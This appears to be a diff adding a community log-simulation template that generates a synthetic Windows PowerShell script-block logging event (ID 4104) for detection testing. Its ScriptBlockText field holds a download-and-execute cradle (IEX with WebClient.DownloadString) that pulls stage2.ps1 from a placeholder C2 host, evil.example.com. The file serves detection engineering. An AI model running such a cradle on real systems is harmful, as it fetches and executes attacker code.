@@ -1,0 +1,55 @@
+olf_version: "1.0"
+id: "f47ac10b-58cc-4372-a567-000000000003"
+name: "PowerShell Download Cradle"
+description: "Simulates a PowerShell script block logging event capturing a classic download-and-execute cradle. Generates Windows Security Event 4104 as produced by PowerShell v5+ script block logging."
+tier: community
+visibility: public_readonly
+created_by: "openLogForge Community"
+created_at: "2026-06-27T00:00:00Z"
+last_edited_at: "2026-06-27T00:00:00Z"
+exported_at: "2026-06-27T00:00:00Z"
+log_source:
+  category: os
+  platform: Windows
+classification:
+  mitre_tactics:
+    - TA0002
+  mitre_techniques:
+    - T1059.001
+  tags:
+    - windows
+    - powershell
+    - download-cradle
+    - execution
+log_events:
+  - sequence: 1
+    format: windows_evtxml
+    template: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <EventID>4104</EventID>
+          <Computer>{{ computer_name }}</Computer>
+          <TimeCreated SystemTime="{{ _ts_rfc3164 }}"/>
+        </System>
+        <EventData>
+          <Data Name="ScriptBlockText">IEX (New-Object Net.WebClient).DownloadString('http://{{ c2_host }}/{{ payload_path }}')</Data>
+          <Data Name="UserID">{{ username }}</Data>
+        </EventData>
+      </Event>
+    variables:
+      computer_name:
+        type: hostname
+        default: "WORKSTATION-01"
+      _ts_rfc3164:
+        type: timestamp
+        default: "2026-06-27T00:00:00Z"
+        source: generated
+      c2_host:
+        type: hostname
+        default: "evil.example.com"
+      payload_path:
+        type: string
+        default: "stage2.ps1"
+      username:
+        type: string
+        default: "CORP\\jdoe"
